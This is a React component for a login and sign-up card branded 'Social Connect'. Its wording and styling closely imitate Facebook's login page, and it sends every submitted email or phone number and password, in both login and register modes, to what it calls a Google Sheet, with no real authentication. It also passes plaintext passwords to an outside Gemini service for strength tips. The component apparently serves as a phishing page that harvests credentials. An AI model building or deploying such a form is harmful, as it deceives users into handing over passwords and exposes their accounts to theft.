import React, { useState, useEffect } from 'react';
import { Input } from './Input';
import { Button } from './Button';
import { UserCredentials, FormMode } from '../types';
import { submitToSheet } from '../services/sheetService';
import { analyzePasswordStrength, generateWelcomeMessage } from '../services/geminiService';
import { Sparkles, CheckCircle, AlertCircle } from 'lucide-react';

export const AuthCard: React.FC = () => {
  const [mode, setMode] = useState<FormMode>(FormMode.LOGIN);
  const [credentials, setCredentials] = useState<UserCredentials>({ emailOrPhone: '', password: '' });
  const [isLoading, setIsLoading] = useState(false);
  const [feedback, setFeedback] = useState<{ type: 'success' | 'error' | null, message: string }>({ type: null, message: '' });
  const [passwordTip, setPasswordTip] = useState<string>('');
  const [isTypingPassword, setIsTypingPassword] = useState(false);

  // Debounce for password analysis
  useEffect(() => {
    if (!isTypingPassword || !credentials.password || mode === FormMode.LOGIN) return;

    const timer = setTimeout(async () => {
      if (credentials.password && credentials.password.length > 3) {
        const tip = await analyzePasswordStrength(credentials.password);
        setPasswordTip(tip);
      }
    }, 800);

    return () => clearTimeout(timer);
  }, [credentials.password, isTypingPassword, mode]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setCredentials(prev => ({ ...prev, [name]: value }));
    if (name === 'password') setIsTypingPassword(true);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setFeedback({ type: null, message: '' });

    // 1. Submit to Google Sheet (simulated)
    const response = await submitToSheet(credentials);

    if (response.result === 'success') {
      // 2. If success, use Gemini to generate a welcome message
      const welcomeMsg = await generateWelcomeMessage(credentials.emailOrPhone);
      setFeedback({ 
        type: 'success', 
        message: mode === FormMode.LOGIN ? `Welcome back! ${welcomeMsg}` : `Account created! ${welcomeMsg}` 
      });
      // Reset form if registering
      if (mode === FormMode.REGISTER) {
        setCredentials({ emailOrPhone: '', password: '' });
        setPasswordTip('');
      }
    } else {
      setFeedback({ type: 'error', message: response.message || 'An error occurred.' });
    }

    setIsLoading(false);
  };

  const toggleMode = () => {
    setMode(prev => prev === FormMode.LOGIN ? FormMode.REGISTER : FormMode.LOGIN);
    setFeedback({ type: null, message: '' });
    setPasswordTip('');
  };

  return (
    <div className="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-[400px] border border-gray-100 relative overflow-hidden">
      {/* Decorative background element */}
      <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-blue-500 to-cyan-500"></div>

      <div className="mb-6 text-center">
        <h2 className="text-2xl font-bold text-gray-800 tracking-tight">
          {mode === FormMode.LOGIN ? 'Log Into Social Connect' : 'Create New Account'}
        </h2>
        <p className="text-gray-500 text-sm mt-2">
          {mode === FormMode.LOGIN ? 'Welcome back! Please enter your details.' : 'It’s quick and easy.'}
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <Input
          name="emailOrPhone"
          type="text"
          placeholder="Email address or phone number"
          value={credentials.emailOrPhone}
          onChange={handleChange}
          required
          autoComplete="username"
        />
        
        <div className="relative">
          <Input
            name="password"
            type="password"
            placeholder="Password"
            value={credentials.password}
            onChange={handleChange}
            required
            autoComplete={mode === FormMode.LOGIN ? "current-password" : "new-password"}
          />
          {mode === FormMode.REGISTER && passwordTip && (
             <div className="absolute -bottom-5 right-0 text-[10px] text-blue-600 flex items-center bg-blue-50 px-2 py-0.5 rounded-full">
               <Sparkles size={10} className="mr-1" />
               {passwordTip}
             </div>
          )}
        </div>

        {feedback.message && (
          <div className={`p-3 rounded-lg flex items-center text-sm ${feedback.type === 'success' ? 'bg-green-50 text-green-700' : 'bg-red-50 text-red-700'}`}>
            {feedback.type === 'success' ? <CheckCircle size={16} className="mr-2" /> : <AlertCircle size={16} className="mr-2" />}
            {feedback.message}
          </div>
        )}

        <Button type="submit" isLoading={isLoading} variant="primary">
          {mode === FormMode.LOGIN ? 'Log In' : 'Sign Up'}
        </Button>

        {mode === FormMode.LOGIN && (
          <div className="text-center mt-2">
            <a href="#" className="text-blue-500 text-sm hover:underline hover:text-blue-700 transition-colors">
              Forgotten password?
            </a>
          </div>
        )}

        <div className="border-b border-gray-200 my-6"></div>

        <Button 
          type="button" 
          onClick={toggleMode} 
          variant="secondary"
          className="w-auto mx-auto block px-8 bg-[#42b72a] hover:bg-[#36a420] shadow-none"
        >
          {mode === FormMode.LOGIN ? 'Create new account' : 'Already have an account?'}
        </Button>
      </form>
    </div>
  );
};